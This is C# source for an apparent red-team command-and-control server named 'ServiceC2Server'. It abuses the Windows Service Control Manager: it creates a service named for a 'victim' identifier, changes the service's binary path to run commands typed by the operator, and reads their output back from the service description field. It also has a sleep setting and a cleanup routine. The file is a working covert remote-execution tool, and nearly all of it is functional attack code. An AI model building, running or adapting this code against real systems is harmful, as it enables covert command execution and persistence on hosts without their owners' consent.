using System;
using System.Management;
using System.Runtime.InteropServices;

namespace ServiceC2Server
{
    internal class Program
    {

        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfig2(IntPtr hService, int dwInfoLevel, IntPtr lpInfo);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateServiceA(IntPtr hSCManager, string lpServiceName, string lpDisplayName, uint dwDesiredAccess, uint dwServiceType, uint dwStartType, uint dwErrorControl, string lpBinaryPathName, [Optional] string lpLoadOrderGroup, [Optional] string lpdwTagId, [Optional] string lpDependencies, [Optional] string lpServiceStartName, [Optional] string lpPassword);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool DeleteService(IntPtr hService);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool CloseServiceHandle(IntPtr hService);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern bool QueryServiceConfigA(IntPtr hService, IntPtr lpServiceConfig, UInt32 cbBufSize, out UInt32 pcbBytesNeeded);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern bool QueryServiceConfig2A(IntPtr hService, UInt32 dwInfoLevel, IntPtr buffer, UInt32 cbBufSize, out UInt32 pcbBytesNeeded);

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();

        [StructLayout(LayoutKind.Sequential)]
        internal struct SERVICE_DESCRIPTION
        {
            public string lpDescription;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct QUERY_SERVICE_CONFIG
        {
            public int serviceType;
            public int startType;
            public int errorControl;
            public IntPtr binaryPathName;
            public IntPtr loadOrderGroup;
            public int tagID;
            public IntPtr dependencies;
            public IntPtr startName;
            public IntPtr displayName;
        }


        static void PrintHelp()
        {
            Console.WriteLine(
                "sleep <int>      Sets the sleep time to int given\n" +
                "cmd <command>    Executes the value of command\n" +
                "exit             Exits the application gracefully");
        }


        public static IntPtr Connect(string serviceName)
        {
            IntPtr SCMHandle = OpenSCManager(null, null, 0xF003F);
            if (SCMHandle == IntPtr.Zero)
            {
                Console.WriteLine("\t[-] Failed to get SCM handle: ");
                return IntPtr.Zero;

            }
            Console.WriteLine("\t[+] OpenSCManager [OK]");

            IntPtr schService = OpenService(SCMHandle, serviceName, 0xF01FF);
            if (schService == IntPtr.Zero)
            {
                Console.WriteLine("\t[-] Failed to connect to service... Trying to create new service...");
                schService = CreateService(SCMHandle, serviceName);
   
            }
            Console.WriteLine("\t[+] OpenService [OK]");

            return schService;
        }

        public static IntPtr CreateService(IntPtr SCMHandle, string serviceName)
        {
            Console.WriteLine("\t[*] Trying to Create a new service called: " + serviceName);
            IntPtr schService = CreateServiceA(SCMHandle,  serviceName, "30", 0xF003F, 0x00000010, 0x00000004, 0x00000000, "whoami", null, null, null, null, null);
            if (schService == IntPtr.Zero)
            {
                Console.WriteLine("\t[-] Failed to create service... Could be a duplicate issue?");
                Console.WriteLine(GetLastError());
                Environment.Exit(1);
            }
            return schService;
        }

        public static void Shutdown(string serviceName, bool ctrlc)
        {
            Console.WriteLine("[+] Closing down...");
            IntPtr schService = Connect(serviceName);
            DeleteService(schService);

            //
            //
            if (!ctrlc)
            {
                Environment.Exit(0);
            }
        }

        public static void Setup(string serviceName)
        {
            IntPtr schService = Connect(serviceName);
        }

        public static void UpdateSleep(string serviceName, string input)
        {
            string sleepTime = input.Split(' ')[1];
            int i = 0;
            bool isInt = int.TryParse(sleepTime, out i);

            if (!isInt)
            {
                Console.WriteLine("[!] Please provide an integer when using the sleep command");
                return;
            }
            IntPtr schService = Connect(serviceName);

            bool success = ChangeServiceConfigA(schService, 0xffffffff, 2, 0, null, null, null, null, null, null, sleepTime);
            if (!success)
            {
                Console.WriteLine("\t[-] Failed to update sleep timer...");

            }
            Console.WriteLine("[+] Sleep updated to: {0}", sleepTime);

        }

        public static string ReadOutput(string serviceName)
        {
            Console.WriteLine("Waiting for output from " + serviceName);
            string output = "Error";
            
            IntPtr schService = Connect(serviceName);

            IntPtr buffer = IntPtr.Zero;
            uint dwBytesNeeded = 0;
            
            bool result = QueryServiceConfig2A(schService, 1, IntPtr.Zero, dwBytesNeeded, out dwBytesNeeded);
            IntPtr ptr = Marshal.AllocHGlobal((int)dwBytesNeeded);
            result = QueryServiceConfig2A(schService, 1, ptr, dwBytesNeeded, out dwBytesNeeded);
            


            if (result)
            {
                SERVICE_DESCRIPTION service_description = new SERVICE_DESCRIPTION();
                Console.WriteLine(ptr.ToString());

                Marshal.PtrToStructure(ptr, service_description);

                output = service_description.lpDescription;
                Console.WriteLine("Output: " + output);
            }
            
            Marshal.FreeHGlobal(ptr); 
            return output;
        }

        public static void UpdateCommand(string serviceName, string input)
        {
            string newCmd = input.Substring(input.IndexOf(' ')).Remove(0,1);

            IntPtr schService = Connect(serviceName);

            bool success = ChangeServiceConfigA(schService, 0xffffffff, 2, 0, newCmd, null, null, null, null, null, null);
            if (!success)
            {
                Console.WriteLine("\t[-] Failed to Change");

            }
            Console.WriteLine("\t[+] ChangeServiceConfigA [OK]");

            Console.WriteLine("[+] Cmd updated to: {0}", newCmd);
            
            while (true)
            {
                string output = ReadOutput(serviceName); 
                if (output.Length > 0)
                {
                    Console.WriteLine("Got output: " + output);
                    break;
                }
            }
        }

        public static bool PostOutput(string host, string serviceName, string output)
        {

            IntPtr schService = Connect(serviceName);

            SERVICE_DESCRIPTION service_descriptiona = new SERVICE_DESCRIPTION();

            service_descriptiona.lpDescription = output;
            IntPtr sdinfo = Marshal.AllocHGlobal(Marshal.SizeOf(service_descriptiona));
            if (sdinfo == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed marshalling");

            }

            Marshal.StructureToPtr(service_descriptiona, sdinfo, false);
            bool success = ChangeServiceConfig2(schService, 1, sdinfo);

            if (!success)
            {
                Console.WriteLine("[-] Output update failed");
            }
            Console.WriteLine("[+] Output updated successfully");

            return success;
        }




        static void Main(string[] args)
        {
            if (args.Length != 1)
            {
                Console.WriteLine("ServiceC2Server.exe <Unique Identifier");
                Console.WriteLine("ServiceC2Server.exe victim01");
                Environment.Exit(0);
            }
            string serviceName = "ServiceC2" + args[0];

            //Catching Ctrl + C events to clean up correctly...
            Console.CancelKeyPress += delegate
            {
                Shutdown(serviceName, true);
            };

            //Setup all the requirements for the C2 server to work...
            Setup(serviceName);

            //C2 Loop
            Console.WriteLine("[+] Ready...");
            while (true)
            {
                Console.WriteLine(">");
                string input = Console.ReadLine();
                if (input == "h" || input == "help")
                {
                    PrintHelp();
                }

                if (input.StartsWith("sleep", StringComparison.OrdinalIgnoreCase))
                {
                    UpdateSleep(serviceName, input);
                }

                if (input.StartsWith("cmd", StringComparison.OrdinalIgnoreCase))
                {
                    UpdateCommand(serviceName, input);
                }

                if (input.StartsWith("exit", StringComparison.OrdinalIgnoreCase))
                {
                    Shutdown(serviceName, false);
                }
            }
        }
    }
}
